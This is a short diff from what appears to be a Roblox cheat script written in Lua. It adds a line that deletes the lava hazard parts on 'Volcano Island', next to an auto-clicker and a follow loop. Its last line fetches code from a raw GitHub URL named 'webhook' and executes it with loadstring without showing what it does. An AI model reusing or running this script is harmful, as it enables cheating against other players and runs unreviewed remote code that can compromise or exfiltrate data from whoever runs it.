@@ -293,4 +293,6 @@ end)
 startAutoClicker()
 followLoopFrom(workspace.Islands["Jungle Island"])
 
+workspace.Islands["Volcano Island"]:WaitForChild("LavaParts"):Destroy()
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
